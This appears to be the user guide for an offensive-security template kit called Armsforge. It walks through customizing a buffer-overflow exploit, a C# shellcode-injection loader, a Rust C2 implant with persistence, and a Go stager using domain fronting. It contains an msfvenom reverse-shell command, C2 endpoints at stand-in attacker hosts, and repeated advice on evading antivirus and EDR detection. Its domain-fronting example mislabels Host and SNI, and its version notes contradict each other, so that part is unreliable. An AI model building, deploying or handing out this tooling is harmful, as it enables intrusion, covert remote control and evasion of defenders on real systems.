# Armsforge Templates Guide

Complete guide to Armsforge code templates, customization, and development workflows.

## Overview

Armsforge provides production-ready templates for common offensive security tasks. Each template is a starter project with:

- Complete working code structure
- Configuration sections clearly marked with `TODO` comments
- Inline documentation for each section
- OPSEC considerations noted
- Build/compilation instructions
- Usage examples

## Available Templates

### Exploit Templates

#### bof-exploit.py
**Purpose**: Stack-based buffer overflow exploitation

**Features**:
- Bad character analysis
- EIP/RIP offset configuration
- Shellcode integration
- Socket communication
- Windows x86/x64 support

**Customization Steps**:
1. Run `pattern_create` to generate a cyclic pattern
2. Send pattern and crash the target
3. Run `pattern_offset` with EIP/RIP value to find OFFSET
4. Identify bad characters with bad_char_test() function
5. Find return address (JMP ESP gadget) with `ropper` or `objdump`
6. Generate shellcode: `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b '<badchars>' -f python -v SHELLCODE`
7. Update configuration section
8. Test against target

**Build**: No compilation needed (Python 3.6+)

**Example**:
```bash
# Download from MCP: af_get_template "bof-exploit.py"
python3 bof-exploit.py 192.168.1.100 9999
python3 bof-exploit.py 192.168.1.100 9999 --badchars  # Send bad char test
```

---

#### python-exploit.py
**Purpose**: Python exploit framework with advanced features

**Features**:
- Multi-stage exploitation
- Automatic bad character analysis
- ROP gadget integration
- Exception handling
- Logging and debugging

**Use When**:
- You need detailed control and logging
- Building complex multi-stage exploits
- Debugging target behavior
- Integrating with other Python tools (pwntools, impacket)

**Customization**:
- Modify payload generation functions
- Integrate target-specific protocol handling
- Customize logging levels
- Add pre-exploitation reconnaissance

---

### Loader Templates

#### loader-injection.cs
**Purpose**: C# process injection loader with encrypted shellcode

**Features**:
- CreateRemoteThread injection
- AES-256-CBC encryption
- RW → RX memory protection transition (OPSEC)
- Error handling and logging
- x64 platform support

**Customization Steps**:
1. Generate or obtain shellcode
2. Encrypt with AES-256: `openssl enc -aes-256-cbc -S <SALT> -P -in shellcode.bin -out encrypted.bin`
3. Copy KEY and IV to template
4. Set TARGET_PROCESS to your injection target (e.g., "svchost", "explorer")
5. Replace ENCRYPTED_SHELLCODE with your encrypted payload
6. Build: `csc /unsafe /platform:x64 /out:loader.exe loader-injection.cs`
7. Test in lab

**Build**:
```bash
# Option 1: csc (C# compiler from .NET Framework)
csc /unsafe /platform:x64 /out:loader.exe loader-injection.cs

# Option 2: dotnet (modern .NET)
dotnet new console -n LoaderProject
# Copy loader-injection.cs into project
dotnet build -c Release

# Option 3: Visual Studio
# Create new C# Console App (.NET Framework)
# Copy loader-injection.cs content
# Build → Release
```

**OPSEC Notes**:
- Uses VirtualProtectEx to change memory from RW to RX (avoids RWX detection)
- Clears shellcode from managed memory after execution
- No suspicious strings in binary (hardcoded values use byte arrays)

**Deployment**:
```powershell
# Transfer to target
.\loader.exe

# Or with custom injection target
# Modify TARGET_PROCESS before building
```

---

#### Implant Templates

#### implant-skeleton.rs
**Purpose**: Rust-based C2 implant with modular design

**Features**:
- Beacon communication pattern
- Encrypted command channel
- Persistence mechanisms
- Process injection support
- Minimal dependencies (Rust std library)

**Customization**:
1. Configure C2 server address and beacon interval
2. Implement command handlers
3. Add persistence mechanism
4. Integrate with shellcode loader
5. Cross-compile for target

**Build**:
```bash
# Install Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# Build for Windows x64 from Linux/Mac
rustup target add x86_64-pc-windows-msvc
cargo build --target x86_64-pc-windows-msvc --release

# Output: target/x86_64-pc-windows-msvc/release/implant.exe
```

---

#### Stager Templates

#### stager-http.go
**Purpose**: HTTP-based stager with domain fronting support

**Features**:
- Domain fronting capability
- Custom HTTP headers
- Beacon jitter
- Multi-stage payload delivery
- Minimal binary size

**Customization**:
1. Set COMMAND_SERVER URL
2. Configure BEACON_INTERVAL and JITTER
3. Customize User-Agent and headers
4. Add domain fronting (if behind CDN)
5. Cross-compile

**Build**:
```bash
# Build for Windows
GOOS=windows GOARCH=amd64 go build -o stager.exe stager-http.go

# Build with stripped symbols (smaller binary, harder to analyze)
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o stager.exe stager-http.go
```

**Domain Fronting Example**:
```go
// Front through CDN
Host: example.com (actual server)
SNI: evil.com (SNI for HTTPS)
// Requests go to evil.com but appear to be for example.com
```

---

## Template Customization Workflow

### Step 1: Identify Your Needs
- What is the vulnerability class? (BOF, web app, etc.)
- What is the target platform? (Windows, Linux, etc.)
- What is your preferred language? (Python, C#, Rust, Go)
- What are your OPSEC requirements?

### Step 2: Retrieve Template
```
Use MCP tool: af_get_template with name="<template-name>"
```

### Step 3: Understand Configuration Sections
Every template has a `TODO` configuration section:

```python
# === CONFIGURATION ===
OFFSET  = 0                    # TODO: Find with pattern_offset
RET_ADDR = 0x00000000          # TODO: Find with ropper/objdump
BAD_CHARS = b"\x00"            # TODO: Identify bad characters
SHELLCODE = b""                # TODO: Generate with msfvenom
```

### Step 4: Research Detection Patterns
```
For each API/technique in template:
1. af_detection_lookup "<API_NAME>"
2. Review detection patterns
3. Plan evasion if needed
```

### Step 5: Customize for Target
- Replace TODO values
- Add target-specific logic
- Remove comments for production
- Test incrementally

### Step 6: Verify OPSEC
```
Use skill: /armsforge:opsec-review
Review:
  - Suspicious API sequences
  - Hardcoded values
  - Detection patterns
  - Memory permissions
```

### Step 7: Test in Lab
- Deploy to controlled environment
- Monitor with Sysmon, Process Monitor
- Verify execution
- Check for detection
- Iterate if needed

---

## Common Customization Examples

### Example 1: Change Shellcode in BOF Template

**Before**:
```python
SHELLCODE = b""
NOP_SLED = b"\x90" * 16
```

**After** (with msfvenom-generated shellcode):
```python
SHELLCODE = b"\x89\xe5\x83\xec\x14\x8b\x45\x08\x89\x04\x24\xe8\x2f\xfe\xff"
NOP_SLED = b"\x90" * 16
```

### Example 2: Change Target Process in C# Loader

**Before**:
```csharp
static readonly string TARGET_PROCESS = "explorer";
```

**After**:
```csharp
static readonly string TARGET_PROCESS = "svchost";
```

### Example 3: Change C2 Server in Go Stager

**Before**:
```go
const COMMAND_SERVER = "http://192.168.1.50:8080"
```

**After**:
```go
const COMMAND_SERVER = "https://attacker.com/api/cmd"  // With domain fronting
```

---

## Template + Snippet Integration

### Workflow: Encrypted Shellcode Loader

**Step 1**: Get C# loader template
```
af_get_template "loader-injection.cs"
```

**Step 2**: Get AES decryption snippet
```
af_get_snippet "aes-decrypt.cs"
```

**Step 3**: Merge code
- Copy `Decrypt()` function from snippet
- Place in loader template's `Decrypt()` stub
- Update AES parameters

**Step 4**: Encrypt your shellcode
```bash
openssl enc -aes-256-cbc -S $(openssl rand -hex 4) -P \
  -in shellcode.bin -out encrypted.bin -K <key> -iv <iv>
```

**Step 5**: Update template
```csharp
// Paste hex values from encryption
static readonly byte[] KEY = new byte[] { 0x01, 0x02, ... };
static readonly byte[] IV  = new byte[] { 0x01, 0x02, ... };
static readonly byte[] ENCRYPTED_SHELLCODE = new byte[] { 0x01, 0x02, ... };
```

**Step 6**: Build and test
```bash
csc /unsafe /platform:x64 /out:loader.exe loader-injection.cs
```

---

## Template Security Considerations

### Code Review Checklist

Before deploying any customized template:

- [ ] No hardcoded IP addresses or URLs
- [ ] Shellcode/payload is encrypted
- [ ] No suspicious strings visible to static analysis
- [ ] Memory is cleaned after use
- [ ] Error messages don't leak information
- [ ] Logging is disabled in production build
- [ ] Target process/addresses are correct
- [ ] OPSEC review completed

### OPSEC Techniques in Templates

| Template | OPSEC Technique | Benefit |
|----------|-----------------|---------|
| loader-injection.cs | RW → RX transition | Avoids RWX memory detection |
| loader-injection.cs | AES encryption | Shellcode not visible to memory scans |
| stager-http.go | Domain fronting | HTTPS traffic appears legitimate |
| stager-http.go | Beacon jitter | Avoids pattern-based detection |
| all | No suspicious strings | Defeats string-based signature detection |

---

## Building from Templates

### Python Templates
```bash
# No build required
python3 template.py <args>

# Dependencies
pip3 install pwntools requests impacket
```

### C# Templates
```bash
# Option 1: .NET Framework (Windows)
csc /unsafe /platform:x64 /out:binary.exe template.cs

# Option 2: .NET Core (cross-platform)
dotnet new console -n Project
# Copy template content
dotnet build -c Release
# Output: bin/Release/netX.X/Project.exe

# Option 3: Visual Studio
# Create Console App
# Copy template.cs
# Build → Release
```

### Rust Templates
```bash
# Install Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# Build for Windows x64
rustup target add x86_64-pc-windows-msvc
cargo build --target x86_64-pc-windows-msvc --release

# Output: target/x86_64-pc-windows-msvc/release/binary.exe

# Cross-compile from Linux
# Install: cargo install cross
cross build --target x86_64-pc-windows-gnu --release
```

### Go Templates
```bash
# Build for Windows x64
GOOS=windows GOARCH=amd64 go build -o binary.exe template.go

# Strip symbols for smaller binary
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o binary.exe template.go

# Output: binary.exe
```

---

## Testing Templates

### Unit Testing (Local)

Before deploying to target:

1. **Static Analysis**:
   ```bash
   # Check for obvious detection signatures
   strings binary.exe | grep -i "shellcode\|payload\|exploit"
   # Should be empty or encrypted
   ```

2. **Compilation**:
   ```bash
   # Verify builds cleanly
   csc /out:test.exe template.cs 2>&1 | grep -i error
   # Should have no errors
   ```

3. **Dependency Check**:
   ```bash
   # Verify all required modules available
   # For Python: pip3 install -r requirements.txt
   # For C#: Ensure .NET available
   # For Rust: rustup target add x86_64-pc-windows-msvc
   ```

### Integration Testing (Lab)

In isolated lab environment:

1. **Monitoring Setup**:
   ```
   - Enable Sysmon
   - Start Process Monitor
   - Enable command-line auditing
   - Monitor ETW (perfmon)
   ```

2. **Execution**:
   ```
   - Transfer binary to test VM
   - Execute in controlled manner
   - Monitor API calls and behavior
   ```

3. **Analysis**:
   ```
   - Check Sysmon logs for alerts
   - Review Process Monitor captures
   - Verify payload execution
   - Document behavior
   ```

4. **Iteration**:
   ```
   - If detected, review detection_lookup results
   - Apply evasion techniques
   - Rebuild and test again
   ```

---

## Template Versioning

Templates are updated as new techniques and evasions emerge:

- **v0.1.0**: Initial templates (classic techniques)
- **v0.2.0**: Added encryption and indirect syscalls
- **v0.3.0**: Domain fronting and beacon jitter

Check template comments for version-specific notes.

---

## Creating Custom Templates

If you develop a reliable technique, consider creating a custom template:

1. **Template Structure**:
   ```
   #!/usr/bin/env python3  (or appropriate shebang)
   # @desc One-line description
   """
   Multi-line explanation:
   - What it does
   - How to use
   - Prerequisites
   """

   # === CONFIGURATION ===
   # (All editable values)

   # === IMPLEMENTATION ===
   # (Core logic)

   # === USAGE ===
   # if __name__ == "__main__":
   ```

2. **Testing**:
   - Test in lab environment multiple times
   - Document all TODOs
   - Add inline comments for complex sections
   - Verify builds/runs cleanly

3. **Documentation**:
   - One-line description in comments (`# @desc`)
   - Multi-line docstring with usage
   - Configuration section with clear labels
   - Usage examples

---

## Troubleshooting Templates

| Issue | Solution |
|-------|----------|
| "Build failed: missing dependency" | Install required package (pip3, dotnet, cargo, go) |
| "Template file not found" | Use `af_list_templates` to verify filename |
| "BadChars mismatch" | Re-run bad character analysis on actual target |
| "Exploit doesn't connect" | Verify target IP/port and firewall rules |
| "Shellcode doesn't execute" | Check shellcode was generated for correct arch (x86 vs x64) |
| "Detected by AV" | Use `af_detection_lookup` and apply evasion from snippets |

---

## Best Practices

1. **Always test in a lab first** - Never deploy untested code
2. **Use encryption for payloads** - Encrypt shellcode and credentials
3. **Plan for target architecture** - x86 vs x64 matters significantly
4. **Document customizations** - Comment all changes you make
5. **Keep templates generic** - Don't hardcode target-specific values
6. **Verify OPSEC before deployment** - Use `af_detection_lookup` and `opsec-review` skill
7. **Monitor execution** - Use Sysmon/Process Monitor to verify behavior
8. **Clean up after testing** - Remove tools and artifacts from lab systems

---

**Last Updated**: March 2026
**Template Version**: 0.1.0
